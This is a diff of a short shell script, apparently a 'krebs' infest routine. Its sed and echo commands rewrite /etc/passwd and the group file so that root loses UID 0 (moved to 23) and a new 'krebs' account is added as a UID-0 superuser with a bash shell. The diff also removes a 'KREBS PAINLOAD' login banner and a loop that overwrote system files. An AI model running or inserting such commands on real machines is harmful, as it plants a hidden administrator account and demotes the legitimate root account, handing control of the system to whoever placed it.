@@ -1,22 +1,12 @@
 #! /bin/sh
 
-cat>/etc/motd.tail<<EOF
-KREBS PAINLOAD (MORE COBRA)
-[31;1m  x x              x x
- xx xx  xx    xx  xx xx
- xx xx  xx    xx  xx xx
-  xxx    x     x   xxx
-   x  xxxxxxxxxxxx  x
-    xxxxxxxxxxxxxxxx
-   x  xxxxxxxxxxxx  x
-  x  x   x     x  x  x
-  x  x   x     x  x  x[m
-EOF
+#prereqs
+/krebs/infest/etc_coexistential
 
 f=/etc/passwd
 sed -ri 's^(root:[^:]+):0:0:(.*)$\1:23:23:\2' $f
 sed -ri '/^krebs/d' $f
-echo 'krebs:x:0:0::/root:/bin/bash' >>$f
+echo "krebs:x:0:0::$HOME:/bin/bash" >>$f
 
 
 f=/etc/shadow 
@@ -29,9 +19,6 @@ sed -ri 's^(root:[^:]+):0:(.*)$\1:23:\2' $f
 sed -ri '/^krebs/d' $f
 echo 'krebs:x:0:' >>$f
 
-for i in etc/*; do
-  cat $i > /$i
-done
 
 # TMPFS for tmp and log
 
